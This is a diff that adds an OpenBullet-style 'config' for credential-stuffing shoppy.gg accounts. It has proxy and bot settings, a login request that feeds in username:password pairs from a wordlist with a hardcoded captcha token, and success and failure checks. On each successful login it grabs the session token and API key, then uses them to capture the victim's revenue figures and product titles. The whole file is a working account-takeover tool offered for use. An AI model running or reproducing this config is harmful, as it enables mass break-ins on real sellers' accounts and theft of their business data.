@@ -1,0 +1,122 @@
+[SETTINGS]
+{
+  "Name": "shoppy.gg",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-03T15:53:16.9877462-04:00",
+  "AdditionalInfo": "",
+  "Author": "i wanna die#0001",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://shoppy.gg/auth/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://shoppy.gg/api/v1/auth/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":true,\"g_recaptcha_response\":\"03AOLTBLQsYwJebXddzQYqvu8GuCc3Lcdktyrjrfz8OKI5oAi6tf89Wia5vnV1Q0dQXBA-QHU6kZPUhHWsNppgfC74rsNJV7Zr0Jdg2NWhlKhBSa-64FOdBgC3XPwtKJ6xd9ctuNBXcpI17l1veUb8yG5JuvVymE7C59EacM6398e1Z5GUShGWqgEsPe5btLxsa2mRhHHu-0n17kUkui7-3IHNeAI840kdOhQqTvT_FRU7EQAbbk3Zj8FWUEQyoSp_po6WLLQhYVSn4XEMA7RXEHcjcl9btgqIDmbNKPz7_OOWsnELLiNStjy8LWun7M2B3AS7yq1ts_zENc_SIPlGWKGlDkelozU2H5Zy4-PWVWWLoaBonqqKmZEIhUXKgSRm-1Hwi0qy6RNUdJeUHQWu_boaKGvp7kZppxZ2dSAPU6vyVxB-JX3Qb3wQqKUniZYR_qo2X1TOm-DYqgr2XBmc_RXThEFkhFnnKoqIPJMn5mmX6qL8ED2W69k\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en,en-US;q=0.9,ar;q=0.8,zh-CN;q=0.7,zh;q=0.6,fr;q=0.5" 
+  HEADER "authorization: 4xMnnXP1XspWDWTvU1UKgc7VMmXGizucPaSxury9zZhqb7055Q" 
+  HEADER "content-length: 591" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://shoppy.gg" 
+  HEADER "referer: https://shoppy.gg/auth/login" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "These credentials do not match our records." 
+  KEYCHAIN Success OR 
+    KEY "Login successful" 
+
+PARSE "<SOURCE>" LR "token\":\"" "\"" -> VAR "TOKEN" 
+
+REQUEST GET "https://shoppy.gg/api/v1/user" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "cookie: __cfduid=d30a3f33480e6dfb2cac187cc12fb3ce91583463830; __stripe_mid=4a10bdc4-ee6f-4f48-8fcf-5ec32506c6b9; __stripe_sid=cf1c12a3-61f4-4a47-8adb-173de3345309; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=<COOKIES(remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d)>; token=<TOKEN>; shoppy_session=<COOKIES(shoppy_session)>" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "api_key\":\"" "\"" -> VAR "TOK" 
+
+REQUEST GET "https://shoppy.gg/api/v1/home/metrics?range=1000&card=Revenue" 
+  
+  HEADER "cookie: __cfduid=d30a3f33480e6dfb2cac187cc12fb3ce91583463830; __stripe_mid=4a10bdc4-ee6f-4f48-8fcf-5ec32506c6b9; __stripe_sid=cf1c12a3-61f4-4a47-8adb-173de3345309; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=<COOKIES(remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d)>; token=<TOKEN>; shoppy_session=<COOKIES(shoppy_session)>" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "authorization: <TOK>" 
+
+PARSE "<SOURCE>" LR "{\"value\":" "," CreateEmpty=FALSE -> CAP "TOTAL" 
+
+REQUEST GET "https://shoppy.gg/api/v1/products?page=1" 
+  
+  HEADER "cookie: __cfduid=d30a3f33480e6dfb2cac187cc12fb3ce91583463830; __stripe_mid=4a10bdc4-ee6f-4f48-8fcf-5ec32506c6b9; __stripe_sid=cf1c12a3-61f4-4a47-8adb-173de3345309; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=<COOKIES(remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d)>; token=<TOKEN>; shoppy_session=<COOKIES(shoppy_session)>" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "authorization: <TOK>" 
+
+PARSE "<SOURCE>" LR "\"title\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "PRODUCTS" 
+
